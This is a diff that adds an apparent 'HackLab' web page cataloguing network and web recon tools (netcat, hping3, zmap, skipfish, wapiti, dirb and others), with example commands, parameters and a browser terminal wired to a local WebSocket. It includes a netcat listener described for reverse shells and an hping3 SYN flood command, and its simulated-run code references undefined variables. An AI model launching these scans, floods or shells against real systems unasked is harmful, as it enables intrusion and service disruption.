+          { param: "-oG", description: "Output in grepable format" },
+          { param: "--banners", description: "Grab banners from services" },
+          { param: "--adapter", description: "Specify network interface" },
+        ],
+      },
+      netcat: {
+        name: "Netcat",
+        command: "nc -lvnp 4444",
+        description:
+          "A lightweight networking tool used for reading, writing, and creating TCP/UDP connections. Ideal for debugging, reverse shells, and file transfers.",
+        category: "Network Utility",
+        version: "0.7.1",
+        docs: "https://nc110.sourceforge.io/",
+        image: "../assets/img/netcat.png",
+        usage:
+          "Netcat (often called nc) is a flexible command-line networking tool used for manual TCP/UDP communication. It can create reverse shells, listen on ports, transfer files, and even scan for open ports.",
+        examples: [
+          "Start a listener:\n  nc -lvnp 4444",
+          "Connect to a listener:\n  nc 192.168.1.1 4444",
+          "Transfer a file (receiver):\n  nc -lvnp 4444 > received.txt",
+          "Transfer a file (sender):\n  nc 192.168.1.1 4444 < file.txt",
+          "Port scanning:\n  nc -zv 192.168.1.1 1-1000",
+        ],
+        parameters: [
+          {
+            param: "-l",
+            description: "Listen mode (for inbound connections)",
+          },
+          { param: "-v", description: "Verbose output" },
+          { param: "-n", description: "Numeric-only IP addresses (no DNS)" },
+          { param: "-p", description: "Local port number" },
+          { param: "-z", description: "Zero-I/O mode (for scanning)" },
+        ],
+      },
+      hping3: {
+        name: "Hping3",
+        command: "hping3 -S 192.168.1.1 -p 80 -c 5",
+        description:
+          "A packet crafting tool used for network scanning, firewall testing, and DoS simulation. Useful for analyzing TCP/IP stack behavior.",
+        category: "Packet Crafting",
+        version: "3.0.0",
+        docs: "http://www.hping.org/",
+        image: "../assets/img/hping3.png",
+        usage:
+          "Hping3 is a network tool able to send custom TCP/IP packets. It's often used for firewall testing, TCP scanning, DoS simulations, and TTL/hop limit tracing.",
+        examples: [
+          "SYN scan on port 80:\n  hping3 -S 192.168.1.1 -p 80",
+          "UDP scan:\n  hping3 --udp -p 53 192.168.1.1",
+          "Traceroute:\n  hping3 --traceroute -V -S -p 80 192.168.1.1",
+          "Flood test:\n  hping3 --flood -S -p 80 192.168.1.1",
+        ],
+        parameters: [
+          { param: "-S", description: "SYN flag (for TCP scans)" },
+          { param: "-p", description: "Target port number" },
+          { param: "--udp", description: "UDP mode" },
+          {
+            param: "--flood",
+            description: "Send packets as fast as possible",
+          },
+          { param: "--traceroute", description: "Traceroute mode" },
+        ],
+      },
+      zmap: {
+        name: "ZMap",
+        command: "zmap -p 80 192.168.1.0/24",
+        description:
+          "A lightning-fast, command-line network scanner for Internet-wide port scanning. Optimized for speed and scalability.",
+        category: "Port Scanning",
+        version: "3.0.0",
+        docs: "https://zmap.io/documentation.html",
+        image: "../assets/img/zmap.png",
+        usage:
+          "ZMap is a fast, single-packet network scanner optimized for performing Internet-wide scans. It is ideal for researchers and red teams needing to identify large sets of devices quickly.",
+        examples: [
+          "Scan for HTTP servers:\n  zmap -p 80 192.168.1.0/24",
+          "Scan with rate limit:\n  zmap -p 443 -r 10000 10.0.0.0/8",
+          "Output results to file:\n  zmap -p 22 -o results.txt 192.168.0.0/16",
+          "Scan with banner grabbing:\n  zmap -p 80 --probe-module=http 192.168.1.0/24",
+        ],
+        parameters: [
+          { param: "-p", description: "Port to scan" },
+          { param: "-r", description: "Packets per second rate limit" },
+          { param: "-o", description: "Output file for results" },
+          {
+            param: "--probe-module",
+            description: "Module for service detection",
+          },
+          { param: "-B", description: "Bandwidth limit (e.g., 10M)" },
+        ],
+      },
+      tcptraceroute: {
+        name: "TCPTraceroute",
+        command: "tcptraceroute 192.168.1.1 80",
+        description:
+          "A traceroute implementation that uses TCP packets instead of ICMP/UDP, allowing route tracing through firewalls and filtered networks.",
+        category: "Network Mapping",
+        version: "1.5",
+        docs: "https://linux.die.net/man/1/tcptraceroute",
+        image: "../assets/img/tcptraceroute.png",
+        usage:
+          "TCPTraceroute is a diagnostic tool used to map the path packets take to reach a remote host using TCP instead of traditional ICMP. This allows it to bypass many firewalls and filters that block ping or UDP-based traceroute.",
+        examples: [
+          "Trace path to web server:\n  tcptraceroute example.com 80",
+          "Trace with specific interface:\n  tcptraceroute -i eth0 10.0.0.1 443",
+          "No DNS resolution:\n  tcptraceroute -n 192.168.1.1 22",
+          "Set max hops:\n  tcptraceroute -m 20 192.168.1.1 3389",
+        ],
+        parameters: [
+          { param: "-p", description: "Destination port (default: 80)" },
+          { param: "-i", description: "Network interface to use" },
+          { param: "-n", description: "No DNS resolution (numeric output)" },
+          { param: "-m", description: "Maximum number of hops" },
+          { param: "-q", description: "Number of queries per hop" },
+        ],
+      },
+      whatweb: {
+        name: "WhatWeb",
+        command: "whatweb https://example.com",
+        description:
+          "Website fingerprinting tool that detects technologies used by a web server, including CMS, frameworks, analytics, and plugins.",
+        category: "Web Fingerprinting",
+        version: "0.5.5",
+        docs: "https://www.morningstarsecurity.com/research/whatweb",
+        image: "../assets/img/whatweb.png",
+        usage:
+          "WhatWeb identifies websites by analyzing HTTP headers, HTML content, JavaScript, and more. It helps discover technologies like CMSs, frameworks, server types, and analytics tools.",
+        examples: [
+          "Basic website scan:\n  whatweb https://example.com",
+          "Aggressive scan:\n  whatweb -a 3 https://target.com",
+          "Scan from input file:\n  whatweb -i urls.txt",
+          "Output to JSON:\n  whatweb --log-json=output.json https://example.com",
+        ],
+        parameters: [
+          { param: "-a", description: "Aggression level (1-3)" },
+          { param: "-i", description: "Input file with URLs" },
+          { param: "-v", description: "Verbose output" },
+          { param: "--log-json", description: "Save results in JSON format" },
+          { param: "--color", description: "Colorize output" },
+        ],
+      },
+      skipfish: {
+        name: "Skipfish",
+        command: "skipfish -o output https://example.com",
+        description:
+          "A high-speed web application scanner designed to map and assess vulnerabilities through recursive crawling and fuzzing.",
+        category: "Web Security",
+        version: "2.10b",
+        docs: "https://code.google.com/archive/p/skipfish/wikis/Documentation.wiki",
+        image: "../assets/img/skipfish.png",
+        usage:
+          "Skipfish is an active web application security reconnaissance tool that performs recursive crawling and dictionary-based fuzzing to detect vulnerabilities like XSS, SQLi, header injection, and outdated components.",
+        examples: [
+          "Basic scan:\n  skipfish -o output https://example.com",
+          "Limit requests:\n  skipfish -o output -m 1000 https://target.com",
+          "Custom wordlist:\n  skipfish -W custom.dict -o output https://target.com",
+          "With authentication:\n  skipfish -A user:password -o output https://intranet.site",
+        ],
+        parameters: [
+          { param: "-o", description: "Output directory for report" },
+          { param: "-W", description: "Wordlist file for fuzzing" },
+          { param: "-m", description: "Max number of HTTP requests" },
+          { param: "-A", description: "HTTP authentication credentials" },
+          { param: "-I", description: "Include directory (e.g., /admin/)" },
+        ],
+      },
+      wapiti: {
+        name: "Wapiti",
+        command: "wapiti https://example.com -o output",
+        description:
+          "A web vulnerability scanner that audits websites by injecting payloads to identify flaws such as XSS, SQLi, and file disclosure.",
+        category: "Web Security",
+        version: "3.0.4",
+        docs: "http://wapiti.sourceforge.net/",
+        image: "../assets/img/wapiti.png",
+        usage:
+          "Wapiti is a command-line web application vulnerability scanner that supports both blind and visible injections. It crawls the website, detects forms, and injects payloads to test for vulnerabilities such as SQLi, XSS, CRLF, file inclusion, and more.",
+        examples: [
+          "Basic scan:\n  wapiti https://example.com -o output",
+          "Verbose output:\n  wapiti https://example.com -v 2",
+          "Specific modules:\n  wapiti https://example.com -m xss,sql",
+          "With cookies:\n  wapiti -u https://target.com -c cookie.txt",
+        ],
+        parameters: [
+          { param: "-o", description: "Output directory for reports" },
+          { param: "-v", description: "Verbosity level (0-2)" },
+          {
+            param: "-m",
+            description: "Modules to run (xss, sql, file, etc.)",
+          },
+          { param: "-c", description: "Cookie file for authentication" },
+          {
+            param: "-f",
+            description: "Output format (html, json, txt, xml)",
+          },
+        ],
+      },
+      dirb: {
+        name: "Dirb",
+        command: "dirb https://example.com",
+        description:
+          "A simple and fast web content scanner that uses a wordlist to brute-force directories and files on web servers.",
+        category: "Web Recon",
+        version: "2.22",
+        docs: "https://tools.kali.org/web-applications/dirb",
+        image: "../assets/img/dirb.png",
+        usage:
+          "Dirb is a command-line-based content scanner for web applications. It uses a wordlist to brute-force URLs, attempting to discover hidden directories and files on a web server.",
+        examples: [
+          "Basic directory scan:\n  dirb https://target.com",
+          "Custom wordlist:\n  dirb https://target.com /usr/share/wordlists/common.txt",
+          "Ignore 403 errors:\n  dirb https://target.com -f",
+          "Output to file:\n  dirb https://target.com -o results.txt",
+        ],
+        parameters: [
+          { param: "-f", description: "Show forbidden pages (403s)" },
+          { param: "-r", description: "Non-recursive scan" },
+          { param: "-o", description: "Output file for results" },
+          { param: "-S", description: "Silent mode (no banners)" },
+          {
+            param: "-X",
+            description: "File extensions to search (e.g., .php,.html)",
+          },
+        ],
+      },
+      amap: {
+        name: "Amap",
+        command: "amap 192.168.1.1 21,22,80",
+        description:
+          "A network scanner designed to identify applications and services running on open ports, even when the services use non-standard ports.",
+        category: "Service Identification",
+        version: "5.4",
+        docs: "https://tools.kali.org/information-gathering/amap",
+        image: "../assets/img/amap.png",
+        usage:
+          "Amap (Application Mapping) is a tool to discover what application is running on a given port. It can identify applications even if they are not running on their default ports, making it highly useful for penetration testers.",
+        examples: [
+          "Scan specific ports:\n  amap 192.168.1.1 21,22,80",
+          "Scan with input file:\n  amap -i targets.txt",
+          "Output results to file:\n  amap -o output.txt 192.168.1.1",
+          "Scan all ports:\n  amap 192.168.1.1 1 65535",
+        ],
+        parameters: [
+          { param: "-i", description: "Input file containing target IPs" },
+          { param: "-o", description: "Output file for results" },
+          { param: "-b", description: "Suppress banners" },
+          { param: "-q", description: "Quiet mode (minimal output)" },
+          { param: "-C", description: "Use SSL connect" },
+        ],
+      },
+    };
+
+    const toolData = tools[tool] || {
+      name: "Unknown Tool",
+      command: "echo 'Tool not found'",
+      description: "Tool information not available",
+      category: "Unknown",
+      version: "0.0.0",
+      docs: "#",
+      image: "../assets/img/default-tool.png",
+      usage: "Usage information not available for this tool.",
+      examples: [],
+      parameters: [],
+    };
+
+    // Set page content
+    document.getElementById("toolTitle").innerText = toolData.name;
+    document.getElementById("toolBadge").innerText = tool;
+   
+    document.getElementById("toolDescription").innerText =
+      toolData.description;
+    document.getElementById("toolCategory").innerText = toolData.category;
+    document.getElementById("toolVersion").innerText = toolData.version;
+    document.getElementById("toolDocs").href = toolData.docs;
+    document.getElementById("toolImage").src = toolData.image;
+
+    // Set usage section
+    document.getElementById("usageSection").innerHTML = `
+      <p>${toolData.usage}</p>
+      <h5 class="mt-4">Basic Command</h5>
+      <div class="command-block">
+        <code>${toolData.command}</code>
+      </div>
+    `;
+
+    // Set examples section
+    const examplesHTML = toolData.examples
+      .map(
+        (example) => `
+      <div class="command-block mb-2">
+        <code>${example.replace(/\n/g, "<br>")}</code>
+      </div>
+    `
+      )
+      .join("");
+    document.getElementById("examplesSection").innerHTML =
+      examplesHTML || "<p>No examples available.</p>";
+
+    // Set parameters section
+    const paramsHTML = toolData.parameters
+      .map(
+        (param) => `
+      <div class="d-flex mb-2">
+        <div class="me-3" style="min-width: 80px;"><strong>${param.param}</strong></div>
+        <div>${param.description}</div>
+      </div>
+    `
+      )
+      .join("");
+    document.getElementById("parametersSection").innerHTML =
+      paramsHTML || "<p>No parameters available.</p>";
+
+    function runTool() {
+      const outputBox = document.getElementById("terminalOutput");
+      const statusElement = document.getElementById("executionStatus");
+      const progressBar = document.getElementById("progressBar");
+
+      // Simulate command execution
+      outputBox.innerText = `Initializing ${toolData.name}...\n`;
+
+      setTimeout(() => {
+        outputBox.innerText += `Setting up environment...\n`;
+      }, 500);
+
+      setTimeout(() => {
+        outputBox.innerText += `Executing: ${toolData.command}\n`;
+      }, 1000);
+
+      setTimeout(() => {
+        outputBox.innerText += `\n[+] Gathering results...\n`;
+      }, 2000);
+
+      setTimeout(() => {
+        clearInterval(progressInterval);
+        progressBarInner.style.width = "100%";
+
+
+
+        outputBox.innerText += `\n${mockOutput}\n\n`;
+        outputBox.innerText += `[✔] ${toolData.name
+          } execution completed at ${new Date().toLocaleTimeString()}`;
+
+        statusElement.innerHTML =
+          '<span class="status-indicator status-ready"></span><small class="text-muted">Execution completed</small>';
+
+        // Hide progress bar after delay
+        setTimeout(() => {
+          progressBar.classList.add("d-none");
+        }, 1500);
+      }, 3000);
+    }
+
+ 
+  </script>
+  <!-- xterm.js and fit addon -->
+  <script src="https://cdn.jsdelivr.net/npm/xterm/lib/xterm.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit/lib/xterm-addon-fit.js"></script>
+
+  <script>
+    window.addEventListener("DOMContentLoaded", () => {
+      const term = new Terminal({ cursorBlink: true });
+      const fitAddon = new FitAddon.FitAddon();
+      term.loadAddon(fitAddon);
+
+      const container = document.getElementById("xterm");
+      term.open(container);
+      fitAddon.fit();
+
+      // Try both ws://localhost:3000 and same-origin
+      const socket = new WebSocket("ws://localhost:3000");
+
+      socket.addEventListener("open", () => {
+        term.writeln("Connected to HackLab Terminal");
+      });
+
+      socket.addEventListener("message", (event) => {
+        term.write(event.data);
+      });
+
+      term.onData((data) => {
+        socket.send(data);
+      });
+
+      window.addEventListener("resize", () => {
+        fitAddon.fit();
+      });
+    });
+  </script>
+  <script>
+    function goBack() {
+      if (window.history.length > 1) {
+        window.history.back();
+      } else {
+        // fallback to your default tools page
+        window.location.href = 'reconnaissance.html';
+      }
+    }
+  </script>
+
+</body>
+
+</html>
